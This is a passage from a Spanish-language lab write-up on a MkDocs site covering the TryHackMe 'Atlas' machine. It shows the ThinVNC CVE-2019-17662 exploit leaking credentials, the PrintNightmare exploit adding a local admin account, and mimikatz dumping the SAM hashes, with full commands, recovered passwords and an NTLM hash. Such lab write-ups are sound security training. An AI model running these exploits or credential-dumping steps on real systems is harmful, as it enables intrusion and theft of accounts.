+<p>Descargamos el exploit  <a href="https://github.com/MuirlandOracle/CVE-2019-17662">https://github.com/MuirlandOracle/CVE-2019-17662</a></p>
+<div class="highlight"><span class="filename">CVE-2019-17662.py</span><pre><span></span><code>./CVE-2019-17662.py<span class="w"> </span><span class="m">10</span>.201.53.80<span class="w"> </span><span class="m">8080</span><span class="w">     </span>
+/home/rdrgox/Documents/TryHackMe/atlas/exploits/CVE-2019-17662/./CVE-2019-17662.py:73:<span class="w"> </span>SyntaxWarning:<span class="w"> </span>invalid<span class="w"> </span>escape<span class="w"> </span>sequence<span class="w"> </span><span class="s1">&#39;\ &#39;</span>
+<span class="w">  </span><span class="k">else</span>:
+/home/rdrgox/Documents/TryHackMe/atlas/exploits/CVE-2019-17662/./CVE-2019-17662.py:89:<span class="w"> </span>SyntaxWarning:<span class="w"> </span>invalid<span class="w"> </span>escape<span class="w"> </span>sequence<span class="w"> </span><span class="s1">&#39;\/&#39;</span>
+<span class="w">  </span>self.args.host<span class="w"> </span><span class="o">=</span><span class="w"> </span>re.sub<span class="o">(</span><span class="s2">&quot;https?://|\/</span>$<span class="s2">&quot;</span>,<span class="w"> </span><span class="s2">&quot;&quot;</span>,<span class="w"> </span>self.args.host<span class="o">)</span>
+
+<span class="w">     </span>_____<span class="w"> </span>_<span class="w">     </span>_<span class="w">    </span>__<span class="w">     </span>___<span class="w">   </span>_<span class="w">  </span>____<span class="w"> </span>
+<span class="w">    </span><span class="p">|</span>_<span class="w">   </span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>__<span class="w"> </span><span class="o">(</span>_<span class="o">)</span>_<span class="w"> </span>_<span class="se">\ \ </span><span class="w">  </span>/<span class="w"> </span>/<span class="w"> </span><span class="se">\ </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>/<span class="w"> </span>___<span class="p">|</span>
+<span class="w">      </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="s1">&#39;_ \| | &#39;</span>_<span class="w"> </span><span class="se">\ \ </span>/<span class="w"> </span>/<span class="p">|</span><span class="w">  </span><span class="se">\|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">    </span>
+<span class="w">      </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\ </span>V<span class="w"> </span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="se">\ </span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>___<span class="w"> </span>
+<span class="w">      </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>/<span class="w">  </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="se">\_</span><span class="p">|</span><span class="se">\_</span>___<span class="p">|</span>
+
+<span class="w">                            </span>@MuirlandOracle
+
+
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Credentials<span class="w"> </span>Found!
+Username:<span class="w">   </span>Atlas
+Password:<span class="w">   </span>H0ldUpTheHe@vens
+</code></pre></div>
+<p>Elevar privilegios, PrintSpooler es conocido por sus vulnerabilidades de escalada de privilegios. Se ejecuta con los permisos máximos disponibles (bajo la cuenta NT AUTHORITY\SYSTEM) y es un objetivo frecuente en la investigación de vulnerabilidades. Se han encontrado numerosas vulnerabilidades en este servicio en el pasado; sin embargo, una de las más recientes se conoce como "PrintNightmare".</p>
+<p>Descargamos exploit
+<div class="highlight"><pre><span></span><code>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/calebstewart/CVE-2021-1675.git
+</code></pre></div></p>
+<p>Conexión con xfreerdp, y compatimos el recurso.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># compartimos carpeta /tmp</span>
+xfreerdp<span class="w"> </span>/u:Atlas<span class="w"> </span>/p:<span class="s1">&#39;H0ldUpTheHe@vens&#39;</span><span class="w"> </span>/v:10.201.53.80<span class="w"> </span>/cert-ignore<span class="w"> </span>/dynamic-resolution<span class="w"> </span>+clipboard<span class="w"> </span>/drive:share,/tmp
+
+<span class="c1"># compartimos otra carpeta</span>
+xfreerdp<span class="w"> </span>/u:Atlas<span class="w"> </span>/p:<span class="s1">&#39;H0ldUpTheHe@vens&#39;</span><span class="w"> </span>/v:10.201.53.80<span class="w"> </span>/cert-ignore<span class="w"> </span>/dynamic-resolution<span class="w"> </span>+clipboard<span class="w"> </span>/drive:share,/home/rdrgox/Documents/TryHackMe/atlas/<span class="w"> </span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-2.png" /></p>
+<p><img alt="alt text" src="img/image-3.png" /></p>
+<div class="highlight"><pre><span></span><code>powershell<span class="w"> </span>-ep<span class="w"> </span>bypass
+.<span class="w"> </span>.<span class="se">\C</span>VE-2021-1675.ps1
+Invoke-Nightmare<span class="w"> </span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>using<span class="w"> </span>default<span class="w"> </span>new<span class="w"> </span>user:<span class="w"> </span>adm1n<span class="w"> </span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>using<span class="w"> </span>default<span class="w"> </span>new<span class="w"> </span>password:<span class="w"> </span>P@ssw0rd<span class="w"> </span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>created<span class="w"> </span>payload<span class="w"> </span>at<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>tlas<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\1\n</span>ightmare.dll<span class="w"> </span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>using<span class="w"> </span><span class="nv">pDriverPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll&quot;</span><span class="w"> </span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>added<span class="w"> </span>user<span class="w"> </span>as<span class="w"> </span><span class="nb">local</span><span class="w"> </span>administrator<span class="w"> </span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>deleting<span class="w"> </span>payload<span class="w"> </span>from<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>tlas<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\1\n</span>ightmare.dll
+</code></pre></div>
+<p><img alt="alt text" src="img/image-4.png" /></p>
+<p>Usamos un pequeño truco con un comando de PowerShell para iniciar una nueva ventana de comandos segura que se ejecute como administrador.</p>
+<div class="highlight"><pre><span></span><code>Start-Process<span class="w"> </span>powershell<span class="w"> </span><span class="s1">&#39;Start-Process cmd -Verb RunAs&#39;</span><span class="w"> </span>-Credential<span class="w"> </span>adm1n
+</code></pre></div>
+<p><img alt="alt text" src="img/image-5.png" /></p>
+<p>Otra manera de lanzar la cmd como adnmin</p>
+<div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span>
+
+<span class="p">.</span> <span class="p">.\</span><span class="n">CVE</span><span class="p">-</span><span class="n">2021</span><span class="p">-</span><span class="n">1675</span><span class="p">.</span><span class="n">ps1</span>
+
+<span class="nb">Invoke-Nightmare</span> <span class="n">-NewUser</span> <span class="s2">&quot;rdrgox&quot;</span> <span class="n">-NewPassword</span> <span class="s2">&quot;P@ssw0rd&quot;</span> <span class="n">-DriverName</span> <span class="s2">&quot;PrintMe&quot;</span>
+<span class="p">[+]</span> <span class="n">created</span> <span class="n">payload</span> <span class="n">at</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Atlas</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">1</span><span class="p">\</span><span class="n">nightmare</span><span class="p">.</span><span class="n">dll</span> 
+<span class="p">[+]</span> <span class="n">using</span> <span class="n">pDriverPath</span> <span class="p">=</span> <span class="s2">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll&quot;</span> 
+<span class="p">[+]</span> <span class="n">added</span> <span class="n">user</span> <span class="n">as</span> <span class="n">local</span> <span class="n">administrator</span> 
+<span class="p">[+]</span> <span class="n">deleting</span> <span class="n">payload</span> <span class="n">from</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Atlas</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">1</span><span class="p">\</span><span class="n">nightmare</span><span class="p">.</span><span class="n">dll</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>runas<span class="w"> </span>/user:rdrgox<span class="w"> </span>powershell.exe
+Enter<span class="w"> </span>the<span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>rdrgox:<span class="w"> </span>P@ssw0rd
+</code></pre></div>
+<h2 id="post-explotation">Post-explotation<a class="headerlink" href="#post-explotation" title="Permanent link">&para;</a></h2>
+<p>Nos volvemos a conectar con RDP e iniciamos <code>cmd</code> como administrador</p>
+<div class="highlight"><pre><span></span><code>xfreerdp<span class="w"> </span>/u:adm1n<span class="w"> </span>/p:<span class="s1">&#39;P@ssw0rd&#39;</span><span class="w"> </span>/v:10.201.53.80<span class="w"> </span>/cert-ignore<span class="w"> </span>/dynamic-resolution<span class="w"> </span>+clipboard<span class="w"> </span>/drive:share,/home/rdrgox/Documents/TryHackMe/atlas/<span class="w"> </span>
+</code></pre></div>
+<p>Aveces en mimikatz obtenemos el siguiente error. esto ocurre porqque el usuario de windows no tiene los privilegios <code>ERROR_kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061_: The required privilege is not held by the client (mostly you’re not an administrator)</code>.</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\m</span>imikatz.exe
+
+mimikatz<span class="w"> </span><span class="c1"># privilege::debug</span>
+Privilege<span class="w"> </span><span class="s1">&#39;20&#39;</span><span class="w"> </span>OK
+
+mimikatz<span class="w"> </span><span class="c1"># token::elevate</span>
+Token<span class="w"> </span>Id<span class="w">  </span>:<span class="w"> </span><span class="m">0</span>
+User<span class="w"> </span>name<span class="w"> </span>:
+SID<span class="w"> </span>name<span class="w">  </span>:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM
+
+mimikatz<span class="w"> </span><span class="c1"># lsadump::sam</span>
+Domain<span class="w"> </span>:<span class="w"> </span>GAIA
+SysKey<span class="w"> </span>:<span class="w"> </span>36c8d26ec0df8b23ce63bcefa6e2d821
+Local<span class="w"> </span>SID<span class="w"> </span>:<span class="w"> </span>S-1-5-21-1966530601-3185510712-10604624
+
+SAMKey<span class="w"> </span>:<span class="w"> </span>6e708461100b4988991ce3b4d8b1784e
+
+RID<span class="w">  </span>:<span class="w"> </span>000001f4<span class="w"> </span><span class="o">(</span><span class="m">500</span><span class="o">)</span>
+User<span class="w"> </span>:<span class="w"> </span>Administrator
+<span class="w">  </span>Hash<span class="w"> </span>NTLM:<span class="w"> </span>c16444961f67af7eea7e420b65c8c3eb
+</code></pre></div>
+<p><img alt="alt text" src="img/image-6.png" /></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.path", "content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
